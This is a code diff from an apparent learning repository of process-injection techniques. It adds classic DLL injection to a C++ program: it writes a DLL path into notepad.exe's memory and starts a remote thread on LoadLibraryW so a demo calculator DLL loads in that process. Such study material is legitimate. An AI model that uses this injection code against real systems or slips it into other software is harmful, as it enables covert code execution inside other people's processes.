@@ -45,7 +45,7 @@ static DWORD GetProcId(const WCHAR* procName)
 /// <returns></returns>
 DWORD main()
 {
-    wchar_t calcdll[] = L"..\CalcDll.dll";
+    wchar_t calcdll[] = L"C:\\Users\\sgtlo\\source\\repos\\RaeldZues\\InjectTechniques\\Classic\\CalcDll.dll";
 	wchar_t notepad[] = L"notepad.exe";
     HANDLE remoteProcHandle = INVALID_HANDLE_VALUE; 
     PVOID remoteProcBuffer = NULL; 
@@ -65,6 +65,28 @@ DWORD main()
 		return -1; 
 	}
 	
+	// Step 3 
+	DWORD err = WriteProcessMemory(remoteProcHandle, remoteProcBuffer, (LPVOID)calcdll, sizeof(calcdll), NULL);
+	if (err == 0)
+	{
+		CloseHandle(remoteProcHandle);
+		return -1;
+	}
+	// Find the kernel 32 module 
+	HANDLE hKernel = INVALID_HANDLE_VALUE; 
+	hKernel = GetModuleHandle("Kernel32");
+	// the 0 shows issues with getprocaddr if its not checked against 
+	if (hKernel == INVALID_HANDLE_VALUE || hKernel == 0)
+	{
+		CloseHandle(remoteProcHandle);
+		return -1;
+	}
+	// Find load library 
+	PTHREAD_START_ROUTINE startAddr = (PTHREAD_START_ROUTINE)GetProcAddress(hKernel, "LoadLibraryW");
 
+	// Step 4 
+	CreateRemoteThread(remoteProcHandle, NULL, 0, startAddr, remoteProcBuffer, 0, NULL);
+	// step 5 
+	CloseHandle(remoteProcHandle);
 	return 8675309;
 }
